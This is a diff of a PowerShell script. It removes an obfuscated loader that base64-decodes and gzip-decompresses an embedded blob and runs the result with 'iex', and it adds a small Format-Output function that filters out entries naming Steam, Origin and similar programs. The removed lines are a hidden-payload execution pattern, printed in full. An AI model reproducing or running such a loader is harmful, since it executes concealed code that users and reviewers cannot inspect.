@@ -1,5 +1,7 @@
-$D='System.IO.Compression.DeflateStream';
-$M='FromBase64String';$Z='ReadToEnd';$A=[System.Convert]::$M("eJzFVb1qwzAQ3vUUIhg8xWToZgL5gVIPXRJCZ+OoqRvHKrJLX6FjDVEMBb9cnqSx25iTfaem7VDQIJ8+fffdn8yc6di5kVnurQJvEb6sAt+ZerMw2m6UfE7Xc5lINXZnycni1kfXUgnjaCHWrj9PRKiGNY/P7lSci2bPJy47Hl67S5fc+OCcOAMI3jMbYMiiy+98GtSI7Sxa74/6rV4ocZdSF9Q1IJ+i1AXAkEQ/tTPAjpAb6vddQDcvBVWFk9fKFgYFvsTe8FjDKI76HVVCJKX4r2oU6CyYyatjqS9VSJxAkbUSbTr+kvduUUEQXxLhqoDwRtv5C5gNBE5CmH9jhQ4Zw2e/3difjgP9emAMvcfjrM3WxBSW5oB1gvOBdwZ0BqPi9psNO8fpe+3d01wR9J+IVgMjOhYOIxlDi72co2R472CtgwHp7kObz52wZR6qfLhMhHjiw9s4SeJMRDJdZ/xqNPLB/3IQpI8iyuN0w3dhnN6rcCf4g5TbzPO8AfsACVSnMw==");
-$S=New-Object IO.MemoryStream(,$A);
-$G=New-Object IO.Compression.GzipStream($S,[IO.Compression.CompressionMode]::Decompress);
-$R=New-Object IO.StreamReader($G);iex $R.$Z();
+function Format-Output {
+    param($name, $value)
+    $output = "{0} : {1}" -f $name, $value -replace 'System.Byte\[\]', ''
+    if ($output -notmatch "Steam|Origin|EAPlay|FileSyncConfig.exe|OutlookForWindows") {
+        return $output
+    }
+}
